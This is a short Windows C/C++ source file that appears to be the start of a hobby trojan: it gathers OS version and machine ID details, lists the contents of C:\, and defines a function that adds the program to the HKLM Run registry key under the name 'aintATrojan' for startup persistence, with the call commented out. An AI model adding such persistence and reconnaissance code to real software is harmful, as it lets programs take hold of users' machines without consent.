#include <windows.h>
#include <stdio.h>
#include "osinfo.h"
#include "fileExplorer.h"

#define HKEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

void addToBoot(TCHAR *szPath) {
  char regName[30] = "aintATrojan";
  HKEY newValue;
  RegOpenKey(HKEY_LOCAL_MACHINE, HKEY_PATH, &newValue);
  RegSetValueEx(newValue, regName, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
  RegCloseKey(newValue);
}

int main() {
  OSVERSIONINFOEX info = getOSInfo();
  TCHAR ID[64];
  reconOS(ID, &info);

  TCHAR exePath[MAX_PATH];
  GetModuleFileName(NULL, exePath, MAX_PATH);
  // addToBoot(exePath);

  printf("Running in: %s\n", exePath);
  printf(" Bits: %d\n Major: %d\n Minor: %d\n Build: %d\n Platform: %d\n UID: %s\n ID: %s\n",
      is64bits() ? 64 : 32,
      info.dwMajorVersion,
      info.dwMinorVersion,
      info.dwBuildNumber,
      info.dwPlatformId,
      "",
      ID);

  struct fileExplorer::s_folder folder;
  fileExplorer::getContent(&folder, (char *)"C:\\");
  fileExplorer::print(&folder);

  return 0;
}
